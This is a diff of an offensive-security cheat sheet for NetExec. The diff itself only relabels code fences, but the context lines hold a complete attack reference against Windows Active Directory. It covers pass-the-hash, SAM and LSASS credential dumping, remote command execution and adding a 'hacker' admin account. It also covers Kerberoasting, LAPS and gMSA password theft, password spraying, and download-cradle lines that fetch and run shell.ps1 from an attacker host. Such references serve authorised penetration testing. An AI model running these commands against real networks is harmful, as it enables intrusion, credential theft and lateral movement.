@@ -3,7 +3,7 @@ title: "NetExec (nxc)"
 ---
 NetExec is the actively maintained successor to CrackMapExec. It speaks SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP, and more: use it for credential validation, enumeration, lateral movement, and post-exploitation across an entire subnet in one command.
 
-```bash
+```bash wrap
 # Install / update
 pipx install netexec
 pipx upgrade netexec
@@ -24,7 +24,7 @@ SMB is the primary protocol for Windows enumeration and lateral movement. Start 
 
 Sweep a subnet to find live Windows hosts and identify domain membership, OS version, and SMB signing status.
 
-```bash
+```bash wrap
 nxc smb $SUBNET                                  # discover all SMB hosts on subnet
 nxc smb $SUBNET --gen-relay-list relay.txt       # output hosts with signing disabled (relay targets)
 nxc smb targets.txt                              # read targets from file
@@ -34,7 +34,7 @@ nxc smb targets.txt                              # read targets from file
 
 Test for unauthenticated access before using credentials: null sessions often expose user lists and share names.
 
-```bash
+```bash wrap
 nxc smb $IP -u '' -p ''                          # null session
 nxc smb $IP -u 'guest' -p ''                     # guest account (often enabled)
 nxc smb $IP -u '' -p '' --shares                 # enumerate shares via null session
@@ -46,7 +46,7 @@ nxc smb $IP -u '' -p '' --pass-pol              # dump password policy (check lo
 
 A `(+)` or `[+]` in the output means the credential is valid. `Pwn3d!` means you have admin rights on that host.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD               # basic auth check
 nxc smb $IP -u $USER -p $PASSWORD --local-auth  # auth against local SAM (not domain)
 nxc smb $IP -u $USER -H $HASH                   # pass-the-hash
@@ -60,7 +60,7 @@ nxc smb $IP -u $USER -p $PASSWORD --kdcHost $DC_HOST  # specify KDC for Kerberos
 
 List all shares and their access level: look for non-default shares like `backup`, `data`, `scripts`, `IT`.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD --shares       # list shares + read/write access
 nxc smb $IP -u $USER -p $PASSWORD --disks        # list local disks on the target
 ```
@@ -69,7 +69,7 @@ nxc smb $IP -u $USER -p $PASSWORD --disks        # list local disks on the targe
 
 Recursively enumerate file contents across all shares: outputs a JSON map of every readable file path.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD -M spider_plus                        # spider all readable shares
 nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o SHARE=Data          # spider specific share
 nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o READ_ONLY=false     # also download files
@@ -81,7 +81,7 @@ nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o PATTERN=password    # flag f
 
 Download or upload files directly over SMB without a separate tool.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD --get-file '\\share\path\file.txt' ./local_file.txt  # download
 nxc smb $IP -u $USER -p $PASSWORD --put-file ./local.txt '\\share\path\remote.txt'     # upload
 ```
@@ -90,7 +90,7 @@ nxc smb $IP -u $USER -p $PASSWORD --put-file ./local.txt '\\share\path\remote.tx
 
 Pull users, groups, logged-on sessions, and local admins from the target.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD --users        # list domain users (via SAM/SAMR)
 nxc smb $IP -u $USER -p $PASSWORD --groups       # list domain groups
 nxc smb $IP -u $USER -p $PASSWORD --local-groups # list local groups on target
@@ -103,7 +103,7 @@ nxc smb $IP -u $USER -p $PASSWORD --pass-pol    # dump domain password policy
 
 Enumerate accounts by brute-forcing RIDs over SAMR: works even when `--users` is restricted, and finds local accounts too.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD --rid-brute   # brute RIDs 500-4000 (default)
 nxc smb $IP -u $USER -p $PASSWORD --rid-brute 10000  # brute RIDs up to 10000
 nxc smb $IP -u '' -p '' --rid-brute             # attempt via null session
@@ -113,7 +113,7 @@ nxc smb $IP -u '' -p '' --rid-brute             # attempt via null session
 
 Run commands on the remote host: `-x` uses cmd.exe, `-X` uses PowerShell. Requires admin rights.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD -x 'whoami /all'          # cmd.exe execution
 nxc smb $IP -u $USER -p $PASSWORD -X 'Get-Process'          # PowerShell execution
 nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method wmiexec   # use WMI (no service creation)
@@ -127,7 +127,7 @@ nxc smb $IP -u $USER -p $PASSWORD --no-output -x 'net user hacker Pass123! /add'
 
 Dump credential stores from the target: all require admin rights. Prefer `lsassy` over `--sam` when possible as it handles protections better.
 
-```bash
+```bash wrap
 # SAM database (local account hashes)
 nxc smb $IP -u $USER -p $PASSWORD --sam
 
@@ -155,7 +155,7 @@ nxc smb $DC_IP -u $USER -p $PASSWORD -M backup_operator
 
 Pull system info and generate a hosts file for internal network mapping.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD --generate-hosts-file hosts.txt   # write /etc/hosts-format file
 nxc smb $SUBNET -u $USER -p $PASSWORD --generate-hosts-file internal_hosts.txt
 ```
@@ -164,7 +164,7 @@ nxc smb $SUBNET -u $USER -p $PASSWORD --generate-hosts-file internal_hosts.txt
 
 Change passwords via SMB: useful for self-service changes or when you have ForceChangePassword on another account.
 
-```bash
+```bash wrap
 # Change your own password (knows current)
 nxc smb $IP -u $USER -p $PASSWORD -M change-password -o NEWPASS='NewPass123!'
 
@@ -182,7 +182,7 @@ nxc smb $IP -u $USER -H $HASH -M change-password -o USER=$TARGET NEWPASS='NewPas
 
 Additional recon and abuse modules useful during post-exploitation.
 
-```bash
+```bash wrap
 nxc smb $IP -u $USER -p $PASSWORD -M wdigest -o ACTION=enable   # enable WDigest (plaintext in LSASS)
 nxc smb $IP -u $USER -p $PASSWORD -M wdigest -o ACTION=disable  # disable WDigest
 nxc smb $IP -u $USER -p $PASSWORD -M web_delivery -o URL=http://$LHOST/shell.ps1  # trigger download cradle
@@ -202,7 +202,7 @@ LDAP is the primary channel for querying Active Directory. Use it for targeted a
 
 Validate domain credentials against the DC via LDAP: lighter than SMB and works even when SMB is firewalled. Always include `-d <domain>` and `--dns-server <dc-ip>` so nxc can resolve AD hostnames correctly; without them BloodHound collection and many enumeration modules will fail silently or return incomplete results.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP   # basic LDAP auth check
 nxc ldap $DC_IP -u $USER -H $HASH -d $DOMAIN --dns-server $DC_IP        # PTH via LDAP
 nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP    # use Kerberos ticket
@@ -212,7 +212,7 @@ nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP    # use Ke
 
 Pull user accounts and attributes directly from the directory.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --users                 # list all domain users
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --users --no-sort       # preserve LDAP order
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --groups                # list all domain groups
@@ -227,7 +227,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --subnets  
 
 The `get-desc-users` module reads every user's Description field: admins commonly store passwords there as "notes".
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc-users                        # dump all account Description fields
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc-users -o KEYWORDS=pass,pwd,cred  # filter by keyword
 ```
@@ -236,7 +236,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc
 
 Run arbitrary LDAP filters to extract any attribute from any object class.
 
-```bash
+```bash wrap
 # Full attribute dump for matching objects
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "*"
 
@@ -263,7 +263,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(o
 
 Check which groups a specific user belongs to: useful for understanding what access a compromised account has.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmembership -o USER=$TARGET      # list groups for user
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmembership -o GROUP="Domain Admins" # list members of group
 ```
@@ -272,7 +272,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmem
 
 Collect all AD relationship data in BloodHound format: import the zip into BloodHound CE for graph analysis. The `-d` and `--dns-server` flags are required for name resolution; without them computer object resolution fails and the graph will be missing edges.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --bloodhound -c all       # collect all BloodHound data
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --bloodhound -c DCOnly    # DC-only collection (faster, less noise)
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all           # module alternative
@@ -283,7 +283,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M bloodhou
 
 Request TGS tickets for all SPN-registered accounts: output is in hashcat format ready for offline cracking.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt     # request all kerberoastable TGS hashes
 nxc ldap $DC_IP -u $USER -H $HASH -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt # PTH version
 # Crack: hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
@@ -293,7 +293,7 @@ nxc ldap $DC_IP -u $USER -H $HASH -d $DOMAIN --dns-server $DC_IP --kerberoast ha
 
 Request AS-REP for accounts with pre-authentication disabled: works without credentials if you have a username list.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt     # authenticated, auto-discovers targets
 nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt               # unauthenticated (null session)
 nxc ldap $DC_IP -u users.txt -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt        # test specific user list
@@ -304,7 +304,7 @@ nxc ldap $DC_IP -u users.txt -p '' -d $DOMAIN --dns-server $DC_IP --asreproast h
 
 Retrieve LAPS-managed local admin passwords: the `ms-Mcs-AdmPwd` attribute is readable by accounts explicitly granted access.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps                 # dump all LAPS passwords you can read
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M laps                # module variant
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps --computer DC01 # LAPS for specific computer
@@ -314,7 +314,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps --co
 
 Retrieve Group Managed Service Account passwords: requires membership in the account's `PrincipalsAllowedToRetrieveManagedPassword` group.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M gmsa                # retrieve all readable gMSA passwords
 ```
 
@@ -322,7 +322,7 @@ nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M gmsa    
 
 Check whether the DC enforces LDAP signing and channel binding: if not enforced, LDAP relay attacks are possible.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M ldap-checker        # check signing + channel binding enforcement
 nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP -M ldap-checker                  # also test without credentials
 ```
@@ -331,7 +331,7 @@ nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP -M ldap-checker      
 
 Check how many machine accounts unprivileged users can create: if above 0, RBCD and other attacks requiring a computer account become trivial.
 
-```bash
+```bash wrap
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M maq                 # read ms-DS-MachineAccountQuota
 ```
 
@@ -343,7 +343,7 @@ WinRM (port 5985 HTTP, 5986 HTTPS) provides remote PowerShell access. Requires t
 
 A `(+)` response confirms WinRM access: `Pwn3d!` is not shown for WinRM since access itself implies admin-equivalent rights.
 
-```bash
+```bash wrap
 nxc winrm $IP -u $USER -p $PASSWORD                         # validate WinRM access
 nxc winrm $IP -u $USER -H $HASH                             # PTH via WinRM
 nxc winrm $IP -u $USER --use-kcache                         # Kerberos ticket auth
@@ -354,7 +354,7 @@ nxc winrm $IP -u $USER -p $PASSWORD --ssl                   # HTTPS (port 5986)
 
 `-x` runs a raw command, `-X` runs PowerShell: both return output inline.
 
-```bash
+```bash wrap
 nxc winrm $IP -u $USER -p $PASSWORD -x 'whoami /all'        # cmd.exe command
 nxc winrm $IP -u $USER -p $PASSWORD -X 'Get-Process | Select-Object Name,Id'  # PowerShell command
 nxc winrm $IP -u $USER -p $PASSWORD -X "IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/shell.ps1\")"
@@ -368,7 +368,7 @@ MSSQL (default port 1433) is worth checking for weak auth and code execution via
 
 Try Windows auth with `-windows-auth` before SQL auth: service accounts and domain users often have SQL access via their domain credentials.
 
-```bash
+```bash wrap
 nxc mssql $IP -u $USER -p $PASSWORD                               # SQL auth
 nxc mssql $IP -u $USER -p $PASSWORD -windows-auth                 # Windows/Kerberos auth
 nxc mssql $IP -u $USER -H $HASH -windows-auth                     # PTH with Windows auth
@@ -380,7 +380,7 @@ nxc mssql $SUBNET -u sa -p sa                                     # spray subnet
 
 Run arbitrary T-SQL queries: useful for enumerating linked servers, database contents, and permissions.
 
-```bash
+```bash wrap
 nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT @@version"                                              # server version
 nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT name FROM master.dbo.sysdatabases"                     # list databases
 nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT name FROM master..syslogins"                           # list SQL logins
@@ -393,7 +393,7 @@ nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT IS_SRVROLEMEMBER('sysadmin')"    
 
 Enable and abuse `xp_cmdshell` for OS command execution: requires `sysadmin` or equivalent rights.
 
-```bash
+```bash wrap
 nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami'                   # auto-enables xp_cmdshell, runs cmd, disables after
 nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami' --no-output       # suppress output (for blind execution)
 
@@ -411,7 +411,7 @@ SSH is less common in Windows AD environments but frequently found in Linux targ
 
 Test credentials and run commands: supports password auth, key auth, and Kerberos where configured.
 
-```bash
+```bash wrap
 nxc ssh $IP -u $USER -p $PASSWORD                            # password auth
 nxc ssh $IP -u $USER --key-file ~/.ssh/id_rsa                # private key auth
 nxc ssh $IP -u $USER -p $PASSWORD -x 'id; hostname'         # command execution
@@ -423,7 +423,7 @@ nxc ssh $SUBNET -u root -p $PASSWORD -x 'id'                # sweep subnet
 
 Spray one password across many accounts: always check `--pass-pol` first to get the lockout threshold. Default approach: one password per user per spray cycle, wait between cycles.
 
-```bash
+```bash wrap
 # Single password against a user list
 nxc smb $IP -u users.txt -p 'Password123' --continue-on-success  # don't stop on first hit
 
@@ -448,7 +448,7 @@ nxc smb $IP -u users.txt -p 'Password123' --continue-on-success -d $DOMAIN --kdc
 
 These flags apply across all protocols and control auth method, threading, and output behavior.
 
-```bash
+```bash wrap
 # Authentication
 -u <user>                  # username (file or single value)
 -p <pass>                  # password (file or single value)
